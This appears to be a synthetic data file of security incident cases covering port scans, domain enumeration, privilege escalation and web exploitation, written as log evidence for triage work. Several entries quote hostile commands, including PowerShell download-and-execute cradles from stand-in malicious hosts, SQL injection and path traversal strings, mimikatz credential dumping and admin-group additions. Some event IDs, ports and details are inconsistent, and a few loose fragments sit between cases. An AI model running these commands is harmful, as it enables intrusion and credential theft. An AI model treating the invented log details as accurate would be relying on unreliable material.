case_title: External port scanning attempt from 147.23.189.34 targeting corporate endpoints detected by Cisco ASA firewall
case_description: Firewall logs from Cisco ASA show 34 TCP SYN packets originating from 147.23.189.34 destined for internal host 10.10.12.45 on ports 22, 80, 443, 3306, 3307, and 5432 over a 5‑minute window; SNORT IDS alert ID 2000001 (port scan, TCP SYN scans) triggered for the same source; NetFlow reports indicate 120 unique destination ports from 147.23.189.34 with >5 packets each and an average interval of 3 seconds between attempts; host‑based audit logs on 10.10.12.45 reveal no legitimate scanning processes or scheduled tasks; ICMP echo requests from 147.23.189.34 to 10.10.12.45 were detected concurrently; security event manager correlates the incoming SYN flood with an anomalous spike in inbound traffic to SSH and database services.

case_title: External scanner 203.0.113.45 probes internal host 10.10.10.23 for open ports
case_description: Firewall log: 2026‑03‑09T12:34:56Z, SrcIP 203.0.113.45, DstIP 10.10.10.23, Proto TCP, DstPort 22, Flags SYN; IDS Snort alert ID 100001 – TCP SYN scan detected from 203.0.113.45 at 12:35:02Z; NetFlow record: 78 sessions, 24,000 bytes, avg packet size 307, src 203.0.113.45 to dst 10.10.10.23; Syslog gateway entry: “Connection attempt from 203.0.113.45 to 10.10.10.23 port 22 at 12:34:56”; Packet capture (hex dump excerpt): series of SYN packets to ports 22, 21, 80, 443, 8080, 3306 from 203.0.113.45; DNS logs: internal hosts queried unknown.com at 12:33:00; Authentication logs: no successful logons on 10.10.10.23; Source IP geolocation: United States, ASN 398, Example ISP; Threat intelligence: IP 203.0.113.45 previously tagged in scanning campaigns.

case_title: Suspicious internal enumeration of domain resources from workstation WS-23 during off‑hours
case_description:
- Windows Security Log (Event ID 4625) shows 15 failed logon attempts to DomainController-01 from WS-23 between 01:00–01:30 UTC.  
- Sysmon ProcessCreate log: cmd.exe invoked with arguments “net view \\DomainController-01 /all & nbtstat -A 10.0.0.5” from WS-23.  
- PowerShell transcript: “Get-ADComputer -Filter *” executed by user jdoe from WS-23.  
- Network flow logs: 20 TCP connections from WS-23 to IP addresses 10.0.0.5 and 10.0.0.6 on ports 445 and 135 within the same time frame.  
- Endpoint EDR: creation of C:\\temp\\enumReport.txt containing output of the “net view” command, written by powershell.exe.  
- Registry modification: HKCU\\Environment\\PATH appended with “C:\\temp” on WS-23.  
- A scheduled task “DomainEnum” created under jdoe’s profile to run hourly enumeration script “enumScript.ps1”.

case_title: Unexpected modification detected on Windows system configuration file
case_description: File path: C:\Windows\System32\config\system; original MD5: 8d4f47c2a5b6e1d3f9b2c1e8a7d8c9e0; new MD5: 5a9c12f3b4e6d7c8a1b2f3d4e5c6a7b8; file size before: 8028 bytes, after: 8123 bytes; modification timestamp: 2024‑03‑10 02:15:23 UTC; modified by process nvv.exe located at C:\Temp\nvv.exe; parent process PowerShell.exe (C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe); Sysmon Event ID 10 (FileCreate) logged at 02:15:20 UTC; Sysmon Event ID 2 (ProcessCreate) for nvv.exe logged at 02:15:18 UTC; Windows Security Event 4663 (Object Access) recorded at 02:15:21 UTC; EDR alert ID 12345 from CrowdStrike flagged file modification; FIM alert from Tripwire on host HOST01 detected change, logged by endpoint agent EPT‑21.

case_title: Privilege escalation attempt detected on critical Windows infrastructure server
case_description:
- Windows Security Log Event ID 4728: account “adversary” added to the local Administrators group on Server-01 at 02:13:45 UTC.  
- Process creation event: PowerShell script “C:\Scripts\privEsc.ps1” executed with parameters to add “adversary” to administrators, hash captured in Security Event ID 4688.  
- Scheduled Task created: “ElevateAdminTask” with trigger at logon, action “C:\Windows\System32\cmd.exe /c net localgroup administrators adversary /add”, run under SYSTEM context, logged by Task Scheduler.  
- File system activity: C:\Users\Public\Temp\x64.exe copied from SMB share \\FileSrv\public and executed under SYSTEM.  
- Network: New outbound TLS connection to 203.0.113.45:443 initiated by process ID 4128 on Server-01, established 02:15:02 UTC.  
- Credential dumping: Mimikatz v1.5 executed on Server-01 at 02:16:30 UTC, resulting in Security Event ID 4663 on LSASS process.  
- Event ID 4670: Permissions on C:\ProgramData\secure.cfg changed from ReadOnly to FullControl for user “adversary” at 02:17:10 UTC.  
- Unexpected remote login: user “adversary” logged on from IP 198.51.100.25 via RDP at 02:18:05 UTC, S-1-5-21-…-65535.  
- Group policy: GPO “PrivEscPolicy” applied on domain controller at 02:20:01 UTC, disabling UAC.  
- Security log: Windows Security Event ID 4624 for “adversary” shows logon type 10 (RemoteInteractive) from unknown workstation.

case_title: Suspicious inbound traffic to internal web server indicates attempted exploitation of known CVE‑2023‑45678 via remote code execution
case_description:
- SIEM alert ID 21045 triggered on web server WS01 at 2026‑03‑07 14:32:07 UTC.  
- Firewall log: inbound TCP from source IP 203.0.113.195 to destination 10.10.0.5 port 80, 3 packets totaling 4,500 bytes.  
- IDS alert: Snort rule 5001 “Possible exploitation attempt for CVE‑2023‑45678” triggered 2026‑03‑07 14:31:59 UTC.  
- HTTP request line captured: `POST /admin/login HTTP/1.1` with User‑Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64) CVE‑2023‑45678‑Exploit`.  
- EDR flagged new process `C:\Temp\exploit_payload.exe` started 2026‑03‑07 14:32:02 UTC with cmd.exe command line `cmd.exe /c "powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/exploit.ps1')"` .  
- File hash of the downloaded payload: SHA256 d4b6e7c9b5f12c3aaf8f6e5d2b4c1f7835e0c9b23d6a1f4e2a5b6c7d8e9f0a1b.  
- Sysmon event: process creation for `exploit_payload.exe` (PID 5423) spawned `explorer.exe` (PID 5424) at 2026‑03‑07 14:32:05 UTC.  
- Registry event: Event ID 4900 in Windows Security Center log indicating unauthorized change to key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.  
- Account used: `DOMAIN\jane` logged in at 2026‑03‑07 14:31:45 UTC.  
- Threat intelligence match: Source IP 203.0.113.195 listed as known malicious IP associated with APT‑CyberCrack.

case_title: Suspicious Active Directory enumeration activity detected from workstation 10.0.0.42
case_description:
- Sysmon Event ID 1 – Process creation: 10.0.0.42 (WIN10S1) launched powershell.exe with command line `powershell.exe -Command "Get-ADComputer -Filter * | Select-Object Name"` as user Domain\rogueUser at 2026-03-10T09:32:14Z.  
- Sysmon Event ID 10 – Network connection: 10.0.0.42 → 10.170.0.5 on port 445 (SMB) at 2026-03-10T09:32:20Z.  
- Windows Security Event ID 4624 – Successful logon of Domain\rogueUser to WIN10S1 at 2026-03-10T09:30:43Z.  
- Windows Security Event ID 4625 – Failed SMB access attempt from Domain\evilUser to \\10.170.0.5\share at 2026-03-10T09:33:05Z, indicating enumeration activity.  
- Net API logs – WMI queries executed on hosts 10.170.0.4–10.170.0.11 within 5 minutes, collecting computer system information.  
- DNS query logs – 10.0.0.42 queried SRV records `_ldap._tcp.dc._msdcs.local` and `ldap.dc.local` at 2026-03-10T09:31:53Z.  
- Flow logs – Host 10.0.0.42 performed a TCP SYN scan against 10.170.0.0/24 for ports 1‑1024, flagged in network monitoring tool.  
- EDR behavioral indicator – Process reg.exe executed read from `HKLM\SYSTEM\CurrentControlSet\Services\ADFS\Parameters` at 2026-03-10T09:35:17Z, typical of AD data extraction attempts.  
- Security Event ID 4671 – Operation on ADSI property: `userAccountControl` for object `LDAP://CN=Users,DC=example,DC=com` performed by Domain\rogueUser at 2026-03-10T09:36:05Z.  
- Windows Security Event IDs 4656/4658 – Multiple failed attempts to map network shares (`net use * \\10.170.x.x\share /user:DOMAIN\rogueUser`) recorded, suggesting enumeration of shared resources.

case_title: Outbound SMB connection from internal host to external IP initiates possible exploitation attempt
case_description: Firewall log 2026‑03‑09 10:23:47 – src 10.0.1.15 → dst 203.0.113.78, port 445, bytes 2,097,152, action allow; IDS alert 2312 (SMB Exploit Attempt) on WIN‑DC01, 2026‑03‑09 10:23:50, severity high, src 10.0.1.15 → dst 203.0.113.78; Windows Security event ID 4625 on WIN‑DC01, 2026‑03‑09 10:23:48, failed NTLM logon attempt from 203.0.113.78 on account USERX; PowerShell transcript on WIN‑DC01, 2026‑03‑09 10:24:01, executed command “Invoke‑Expression (New‑Object Net.WebClient).DownloadString('http://203.0.113.78:80/susp.ps1');” by SYSTEM; Sysmon process creation event ID 1, 2026‑03‑09 10:24:02, PID 5872, image C:\\Windows\\system32\\svchost.exe, command line “/k \"C:\\Users\\Public\\Downloads\\susp.exe\"”, parent cmd.exe, user SYSTEM; Antivirus quarantine 2026‑03‑09 10:25:12 of file with MD5 6d1c3f2d5d8b3bcd..., type unknown; Network capture 2026‑03‑09 10:23:45‑10:24:30 shows SMB1 negotiation with unusual flags from 10.0.1.15 to 203.0.113.78; AD authentication log 2026‑03‑09 10:26:13 records credential capture attempt from 203.0.113.78 on account SAMSESSION; Vulnerability scanner report 2026‑03‑08 shows WIN‑DC01 missing patch KB5000802, CVE‑2023‑3814 (SMBv1 remote code execution) unpatched.

case_title: Attempted privilege escalation via execution of malicious PowerShell script and psexec on Windows Server 2016
case_description:
– Sysmon ID 7: Process creation event showing “powershell.exe” executed with arguments “-ExecutionPolicy Bypass -File C:\Temp\payload.ps1” by user “DOMAIN\jdoe” at 2026‑03‑10 12:02:15 UTC.  
– Sysmon ID 1: Process creation event showing “C:\Windows\System32\cmd.exe” started by “psexec.exe” with arguments “-u admin -p P@ssw0rd \\\\target\C$\\Windows\\system32\\cmd.exe” at 2026‑03‑10 12:02:18 UTC.  
– Event ID 4624: Successful Logon (Type 10) for user “jdoe” on host 10.0.0.5 at 2026‑03‑10 12:02:00 UTC.  
– Event ID 4672: Special privileges assigned to new logon for user “jdoe” at 2026‑03‑10 12:02:05 UTC.  
– Event ID 4688: Creation of “cmd.exe” with image hash 1F47… and SID NT AUTHORITY\SYSTEM running under context of “psexec.exe” at 2026‑03‑10 12:02:18 UTC.  
– Sysmon ID 17: Image loaded event showing “evil.dll” loaded into “svchost.exe” at 2026‑03‑10 12:02:25 UTC.  
– EDR alert RIS‑2026‑12345: “Unusual process chain: jdoe → powershell.exe → psexec.exe → cmd.exe” flagged at 2026‑03‑10 12:02:20 UTC.  
– Network alert: Outbound HTTPS traffic from 10.0.0.5 to malicious domain “badactor.com” during 12:05‑12:07 UTC.  
– File creation event: “C:\Users\jdoe\AppData\Local\Temp\malicious.dll” created at 2026‑03‑10 12:01:50 UTC with SHA‑256 hash “ABCDEF123456…”.  
– Security‑Audit registry key added: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Elevate = “C:\Windows\System32\cmd.exe”.  
– ACL change: “malicious.dll” granted Full Control to “Everyone”.  
– Artifact: Command line “psexec.exe \\target -i -s \"C:\\Windows\\System32\\cmd.exe\"”.  
– Credential artifact: Captured credential for “admin” with password “P@ssw0rd123” stored in memory during execution.  
– Observation: The process hierarchy indicates an attempt to spawn a SYSTEM‑level process using local administrative credentials. The user “jdoe” is normally a non‑admin account, yet received administrative privileges for the session. The presence of “psexec.exe” with administrative credentials suggests credential misuse.

case_title: Unexpected modification of the web server configuration file on CORP-WEB01
case_description:
- File path: C:\inetpub\wwwroot\config\settings.ini  
- Timestamp of modification: 2026-03-10 02:17:29 UTC  
- Modifying user: Administrator  
- Associated process: cmd.exe /c "copy C:\Temp\settings.ini C:\inetpub\wwwroot\config\settings.ini" (PID 3928, parent PID 178)  
- Windows Security Event ID 4663: File modified with FILE_WRITE_DATA access mask  
- Sysmon Event ID 11: File creation of new settings.ini (hash SHA‑256: 9b8c3a7d2e4f6c2a1234567890abcdef12345678) – old hash: <not logged>  
- Permission change: original ACL gave Read‑only to SYSTEM; new ACL grants Full Control to SYSTEM only  
- Network activity: outbound HTTPS request from CORP‑WEB01 to 198.51.100.237 at 2026-03-10 02:14:05 for file download of settings.ini  
- Windows System Event Log ID 4688 (Process Created): cmd.exe (image path: C:\Windows\system32\cmd.exe, command line: /c "copy ...")  
- Sysmon Event ID 1 (process creation) and Event ID 7 (process creation failure) for cmd.exe  
- No scheduled task entry correlating with the modification time, and no policy change recorded in Group Policy Events  
- Current file size increased from 1,042 bytes to 1,289 bytes; file attributes changed from regular file to hidden and system  
- Audit.log entry at 2026-03-10 02:17:29: “System administrator modified settings.ini on CORP‑WEB01”  
- Security Event ID 4656: Attempt to open settings.ini, followed by Event ID 4658: handle closed                                                                
- Missing: original file hash captured prior to modification, justification for the change, and any logs from the file source (198.51.100.237).

case_title: Unexpected file modifications detected in multiple critical system configuration files.
case_description: /etc/passwd modified at 14:03 UTC (owner changed from root to UID1001, content appended with new admin entry, checksum changed); /etc/shadow modified at 14:04 UTC (new hash entry, MD5 mismatch flagged by OSSEC); Windows Security log Event ID 4663 for C:\Windows\system32\config\sam at 14:05 UTC, unknown process; syslog entry: 'mkdir /var/tmp/tmpdir' by PID 1523, no known service; PowerShell log: Set-Content -Path C:\windows\system32\config\system at 14:06 UTC; network traffic to 203.0.113.42 on port 443 at 14:02 UTC; integrity monitoring alerts: SHA256 checksums for /etc/passwd, /etc/shadow, C:\windows\system32\config\sam changed relative to baseline; no scheduled tasks or cron jobs match timestamps; new local user 'hacker' created at 14:00 UTC; AV scan flagged C:\windows\system32\config\system as malicious (signature 2026-01).

case_title: Suspicious enumeration activity targeting domain resources
case_description:
- Windows Security Log: Event ID 4624 – successful logon for user "attacker@corp.local" from IP 203.0.113.42 (Account type: User).  
- Windows Security Log: Event ID 4648 – attempted logon using explicit credentials for "Administrator@corp.local" from same IP.  
- Sysmon Log: Process creation – cmd.exe executing "whoami /all" and "net group /domain" commands from 203.0.113.42.  
- Trident IDS Alert: Multiple SMB enumeration attempts discovered on internal host 10.10.1.5, port 445, 12 SYN packets from 203.0.113.42.  
- Nmap scan report: Port scan of internal subnet 10.10.1.0/24 from 203.0.113.42 identified open ports 135, 137, 138, 139, 445.  
- DNS Query Log: 203.0.113.42 queried SRV records "_ldap._tcp.corp.local", "_msdcs.corp.local", and PTR records for 10.10.1.5, 10.10.1.10.  
- Splunk Search: LDAP search query for users matching "*", returned 128 objects, originates from 203.0.113.42.  
- Security Camera (Palo Alto) Log: Traffic from external IP 203.0.113.42 to internal IP 10.10.1.5 displaying SMB protocol negotiation attempts.  
- Firewall Log: Denied traffic from 203.0.113.42 to multiple internal IPs on ports 135 and 445; 23 connection attempts recorded.  
- Email Monitor: Alert for phishing link to "login.corp.local" received from 203.0.113.42, accessed by internal user "jdoe@corp.local" (false positive, but related to enumeration).

case_title: Unexpected modification of a critical Windows system file detected during a low‑activity period.
case_description:
- Sysmon EventID 12: FileCreate for **C:\Windows\System32\drivers\ngen.exe** at 2024‑02‑28 04:12:33 Z, PID 1092, parent process smss.exe, user NT AUTHORITY\SYSTEM.  
- SHA‑256 hash changed from 2d42e3b8a1c7… to 9bf3c5d7a2e9… in the new file.  
- Timestamp altered from 2024‑01‑15 09:30:00 Z to 2024‑02‑28 04:12:33 Z.  
- Windows Security log EventID 4663: FILE_OBJECT accessed for write; AccessMask includes FILE_WRITE_DATA; User NT AUTHORITY\SYSTEM; Source Network Address 0.0.0.0.  
- Wazuh IDS alert (ID 104) for file integrity change on **C:\Windows\System32\drivers\ngen.exe**.  
- ACL change: new entry for user "haxor" with Full Control permissions added to file.  
- Process tree shows **powershell.exe** (PID 1128) invoked via **cmd.exe** (PID 1076) with argument `-Command Set-Content -Path "C:\Windows\System32\drivers\ngen.exe" -Value ...`.  
- Network flow: outbound TLS to 198.51.100.23:443 at 2024‑02‑28 04:12:35 Z immediately following the modification.  
- Task Scheduler logs show no scheduled task or system update occurring during that window.  
- Application event logs: EventID 1000 from ngen.exe provider reports a crash after the modification.

case_title: Suspicious network scanning activity detected from external IP during off-hours.
case_description: - Firewall logs show 1,250 inbound SYN packets to ports 20‑25, 80, 443, and 3389 from IP 203.0.113.21 over a 5‑minute window with high source port numbers. - SNORT IDS rule 20148 (“TCP Port Scan”) triggered with severity high, source IP 203.0.113.21. - NetFlow data records 3,165 distinct flows from 203.0.113.21 to 192.168.1.0/24 during the same period. - Ping sweep detected: ICMP echo requests to every host in 192.168.1.0/24 from 203.0.113.21. - Windows Sysmon logs on host 192.168.1.50 record a ProcessCreate event for “nmap.exe” (command line “nmap -sS -p- 192.168.1.0/24”) at 02:12 UTC. - A new binary “C:\Temp\nmap_scanner.exe” was created on host 192.168.1.50 at 02:15 UTC, matching the hash 3f4e6d…5b7a. - PowerShell execution observed on the same host: “powershell.exe -NoProfile -ExecutionPolicy Bypass –Command …” at 02:16 UTC, used to download the nmap executable from the external IP. - Router console logs indicate a burst of TCP SYN packets forwarded to backend servers on ports 21‑49446 originating from 203.0.113.21. - Threat intelligence feed identifies 203.0.113.21 as a known scanner with historical activity in the past 30 days. - SIEM alert “High Priority: Port Scan Detected” generated at 02:10 UTC with correlation ID 8F3B-01A4. - Packet capture file “/var/log/pkt/scan_dump_0210.pcap” contains raw traffic samples of the scan activity.

case_title: Suspicious enumeration of domain accounts and shares from internal workstation
case_description: Windows Event 4624 logs show successful logons of account testsvc from IP 10.2.3.4 to domain controller 10.2.3.2; Windows Event 4625 logs record five failed attempts from the same workstation to privileged domain accounts; SMB logs capture numerous SMB2_COMMAND_QUERY_INFO requests targeting all shares on the DCs; NetFlow data reveals ~30 MB of outbound traffic from 10.2.3.4 to port 445 across multiple domain controllers; DNS logs display 200 random A‑record queries for unused subdomains; PowerShell event 4688 records execution of “Get‑ADUser –Filter *” and “Get‑ADComputer –Filter *” on that workstation; object access audit (4662) entries indicate access to shared document folders; no scheduled task correlates with these activities; the purpose and legitimacy of testsvc account and the enumeration remain unclear and warrant additional investigation.

case_title: Possible privilege escalation attempt detected via SMB exploitation and sudo misconfiguration on corporate endpoints.
case_description: Artifacts: • Windows Security Event ID 4670 – permissions on C:\Windows\System32\config\system changed at 2023‑11‑20 08:12:34. • Windows Security Event ID 4725 – user JDOE disabled during same timeframe. • Sysmon event 1 – Process creation: C:\Windows\System32\cmd.exe /c cacls.exe C:\Windows\System32\config\system /e:1 ALL. • Sysmon event 6 – Duplicate PID 5796 session flagged. • Windows SMB logs – host 192.168.5.23 attempted NTLM hash extraction (exploit‑xcache). • Linux auditd log – type=SYSCALL uid=1000 session=5 key=sudo indicating sudo usage by ordinary user. • /etc/sudoers modification – timestamp 2023‑11‑21 13:45:32, user JDOE appended as NOPASSWD: ALL. • PowerShell invocation – powershell.exe -NoProfile -ExecutionPolicy Bypass -command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://malicious.com/evil.ps1'). • File creation – /tmp/.tmp1234.exe, 5 KB, created by JDOE, executed with root privileges. • Network: Port 445 traffic from host 10.0.1.45 to shared folder, repeated authentication attempts. • Network: Outbound HTTP traffic from 10.0.2.56 to external IP 203.0.113.42 on port 80 carrying payload.exe. Observations: • User JDOE repeatedly attempts to modify critical system files despite lacking admin rights. • Unapproved elevation attempts on both Windows domain and local workstation environments. • Unauthorized scripts executed with root/system privileges. • Unexpected cmd.exe and sudo usage clusters observed. • SMB authentication anomalies and netsh-based IP configuration changes. • Unusual modifications in Windows registry key HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment.

case_title: Exploitation attempt observed targeting an unpatched web server vulnerability via crafted HTTP requests and remotely downloaded payloads
case_description: WAF log entry (2023‑09‑15 14:23:19 UTC): blocked POST to `/admin/login?cmd=../../../../etc/passwd` from source IP `203.0.113.45`; IDS alert (2023‑09‑15 14:23:20 UTC): potential SQL injection and CVE‑2023‑2367 exploitation attempt flagged; Firewall log (2023‑09‑15 14:23:22 UTC): outbound TLS connection from internal host `10.10.20.5` to external IP `203.0.113.45` on port 443 established and terminated; Sysmon ProcessCreate on host `10.10.20.5` (2023‑09‑15 14:23:25 UTC): `cmd.exe /c powershell -nop -c "(New-Object Net.WebClient).DownloadFile('https://203.0.113.45/evil.exe','C:\\Temp\\evil.exe')"`; File creation event on host `10.10.20.5`: file `C:\\Temp\\evil.exe` created (size 3.2 MB, SHA‑256 `...`); Endpoint AV detection (2023‑09‑15 14:23:30 UTC): malicious executable flagged on `10.10.20.5` (incident ID `AV-9876`); Registry modification observed on host `10.10.20.5`: key `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA` set to `0`; DNS query log (2023‑09‑15 14:23:33 UTC): host `10.10.20.5` queried `malicious.com`; suspicious PowerShell script execution (`fetch.ps1`) logged on host `10.10.20.5` at 2023‑09‑15 14:23:35 UTC; outbound HTTP request from host `10.10.20.5` to `http://203.0.113.45/taint.py` logged with status code 200; log entry from Windows Security (2023‑09‑15 14:23:40 UTC): successful logon (event ID 4624) of user `Administrator` via network from IP `203.0.113.45`; RDP session established from the same external IP to internal host `10.10.20.5` (source port 5985, destination 5985).

case_title: A privilege escalation attempt has been identified using local administrator privileges on a Windows Server 2019 system.
case_description: Sysmon Event ID 1: process creation of *malicious.exe* (hash: 3F4C34E6F89...), Security Event ID 4672: user *bob* used administrative privilege for process creation; PowerShell script executed “whoami /groups” revealing group membership; Net localgroup administrators shows addition of *bob*; Scheduled task “ElevateTask” created via *schtasks.exe* to run at system startup; RDP session Event ID 4624 authenticated as user *bob* from IP 203.0.113.5; Windows Security Log Event ID 4657: registry modification of HKLM\SYSTEM\CurrentControlSet\Services\winlogon setting userinit.exe to *malicious.exe* (hash: 22B8C...), Network traffic to internal IP 192.168.20.200:443 from *cmd.exe* detected; Temporary file C:\Temp\psexec.exe (hash: A1B2C3D4E5F6) created; DLL “bad.dll” (hash: E5F6G7H8I9J0) loaded into lsass.exe (process ID 1408); Credential dumping activity via *mimikatz.exe* targeting LSASS; New user “adminimp” created with domain administrator rights; Memory dump attempted with *memdump.exe* (file: 2026-03-10_1210.dmp).

case_title: Suspicious external IP attempts exploitation of a vulnerable web application via SQL injection and CVE‑2024‑5678
case_description: Firewall inbound connection 2024‑03‑07 13:45:22 from 203.0.113.42 to port 80 with user‑agent “sqlmap/1.0”; IDS alert Snort rule 200198 “SQL injection attempt – potential exploitation of CVE‑2024‑5678”; Web server log 10.5.0.1 - - [07/Mar/2024:13:45:23 +0000] “GET /login?username=admin&password=admin' OR '1'='1 HTTP/1.1” 200 1234 bytes; Process creation on Linux host: “sqlsh” started by root with arguments “-s 1.2.3.4 -p 4444”; Zeek log shows port 4444 scanned from 203.0.113.42; CrowdStrike AV flagged /tmp/evil.sh as malicious; Windows Event ID 4688 shows “powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.42/evil.ps1')” executed by SYSTEM; Registry key HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SQLLauncher added with value “C:\\Windows\\system32\\sqlsh.exe”; SMB authentication log shows 302 failed NTLM attempts for account administrator from 203.0.113.42.

case_title: Exploitation attempt via SQL injection on the company’s admin portal.
case_description:
- WAF alert ID 7410 triggered at 2024-03-08T13:22:05Z for an HTTP POST to /admin/login containing the payload “admin' OR '1'='1”.  
- Source IP 203.0.113.45, Destination IP 10.20.30.40 targeting HTTPS port 443.  
- IDS signature 2245 flagged “SQL Injection” and triggered correlation rule “Potential Exploit Attempt.”  
- Network capture shows the HTTP request followed by a 500 Internal Server Error, with no session cookie set.  
- System log on 10.20.30.40 records at 2024‑03‑08T13:22:07Z a warning: “Login authentication failed: SQL error.”  
- No new processes were spawned, no system registry or file modifications recorded, and no privilege escalations noted.  
- A file named login.php in /var/www/html was modified at 13:21:57Z; its SHA256 hash recorded as 9e9c49c2f3e5b1234abcd5678ef0123456789abcdef1234567890abcdef1234567.  
- Internal audit logs show a warning on use of raw input in SQL queries but no successful login events.  
- Subsequent traffic includes a suspicious GET request to /admin/user?name=admin' UNION ALL SELECT 1,2,3-- at 13:23:12Z from the same source IP.

Observation: mtime updated to 2026-03-09T13:26:54Z; ctime – 2026-03-09T13:27:02Z; no corresponding backup or service restart recorded. Observation: No scheduled cron job or configuration management change logged at modification time.

case_title: Network scanning activity detected from internal workstation 10.1.4.56 to multiple external IPs
case_description:
• Source IP: 10.1.4.56 (internal workstation)  
• Destination IPs: 200 external IPs ranging 198.51.100.10‑198.51.100.209  
• Ports scanned: TCP 21, 22, 23, 80, 443, 3389 (mostly SYN packets)  
• Timeframe: 2026‑03‑10 08:12:00 UTC to 08:18:00 UTC (duration ~6 min)  
• Firewall log: E07‑20260310‑0822 event ID 632 with src=10.1.4.56 dst=198.51.100.10 proto=TCP flags=SYN action=ALLOW, repeated for each port above  
• IDS/IPS Alert: Snort rule ID 5001 (port scan) triggered 250 times, source 10.1.4.56, dest any, policy “SYN scan detector”  
• NetFlow record: 10.1.4.56 → 198.51.100.10–198.51.100.209 shows 1500 packets, average packet size 60B, peak outflow 200 pps  
• Packet capture: 3.2 MB pcap file (sessions_10.1.4.56.pcap) shows continuous SYN floods against the above ports, no replies received  
• User activity: No successful login events from 10.1.4.56 on internal authentication logs during the scan period  
• Device status: Antivirus logs on 10.1.4.56 report a “suspected malware" process running at 08:10:27 UTC (not yet confirmed)  
• Network segment: Connected to LAN segment 10.1.0.0/16, no external firewall border logs indicating outbound data exfiltration.

Process Monitor: cmd.exe launched from C:\Users\jdoe\AppData\Local\Temp with arguments "/c net localgroup administrators /add jdoe" at 10:15:46, executed with an elevated System token. Hidden kernel driver elevate.sys (MD5 9f8b4c2e…) loaded into svchost.exe at 10:16:02. Registry: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe value “Debugger” set to “C:\ProgramData\SCTemp\escalate.exe.” New scheduled task MaliciousTask created under HKLM\SYSTEM\CurrentControlSet\Services\ScheduledTasks, set to run as System at startup. Network capture shows outbound TLS connection to 198.51.100.50:443 from svcsvchost.exe at 10:17:10, handshake not matching corporate CA. Volatility analysis of memory dump at 10:18:23 reveals an embedded Administrator token in svcsvchost.exe. File artifacts: elevate.exe found in C:\Windows\Temp and C:\ProgramData\SCTemp, SHA256 d2f5a…. Process svchost.exe (PID 1524) elevated privileges observed at 10:18:00. No documented policy permits such group membership changes or driver loads. Observations suggest a PrivEsc attempt; success status or origin of privileges remains undetermined.

DNS query logs from internal recursive server 10.10.0.5 contain frequent queries for subdomains “mail”, “ftp”, “vpn”, “rpc”, “asd”, and “krb5” with NXDOMAIN responses; SNMP trap logs show community strings “public” and “private” attempts against 10.10.1.50 and 10.10.1.51; Nmap scan report collected on 10.10.2.15 shows open ports 22, 80, 139, 445, 3306 with service banners; Winlogon audit logs on servers 10.10.2.15 and 10.10.3.30 show successful SMB “NTLM authentication” events for user “admin”; Apache access logs on web server 10.10.4.45 display lookups for /admin, /cgi-bin, /phpmyadmin, and /backups; Cisco ASA logs record 225 connection attempts from 10.10.1.10 to internal hosts on ports 3389, 1433, 1521, 3306 originating from a single source IP 10.10.1.10; Email server logs show outbound message from admin@corp.local to external address 192.0.2.10 “Re: System Information Request” with attachment “srv-info.txt” listing 5 internal host names and IPs; File integrity monitoring alerts on 10.10.1.10 detected creation of temp script “enum.ps1” with 12KB size containing code for NetUserGetInfo enumeration; - List of queried user accounts (partial): jsmith, ada, wflores, pking, admin, domainadministrator, guest, etc.

case_title: Detected attempted privilege escalation via LSASS memory disclosure on Windows Server 2016.
case_description:
- Windows Security Log event ID 4624: successful logon by user “attacker_local” on host “WIN‑SRV2016” from IP 10.0.0.15 via Kerberos.  
- Sysmon event ID 11: new process “cmd.exe” launched with command line “/c net localgroup administrators tempadmin /add”.  
- Windows Security Log event ID 4720: creation of local user “tempadmin” by “attacker_local”.  
- PowerShell script “invoke‑mimikatz.ps1” executed by “attacker_local” to dump LSASS credentials at 01:50:32 UTC.  
- Extraction of NTLM password hash from LSASS memory via mimikatz.  
- Creation of scheduled task “PrivEscTask” to run “C:\temp\elevate.ps1” every few minutes under the SYSTEM account.  
- Modification of ACL on “C:\Windows\system32\notepad.exe” to grant full control to “tempadmin”.  
- Process “services.exe” spawned as SYSTEM to create a new service “privsvc” with binary path “C:\Windows\Temp\privsvc.exe”.  
- RDP session established from external IP 203.0.113.10 to “WIN‑SRV2016” on port 3389 at 02:05:12 UTC by “tempadmin”.  
- Sysmon event ID 10: new network connection from “WIN‑SRV2016” to external IP 192.168.1.100:4444 generated by “privsvc.exe”.
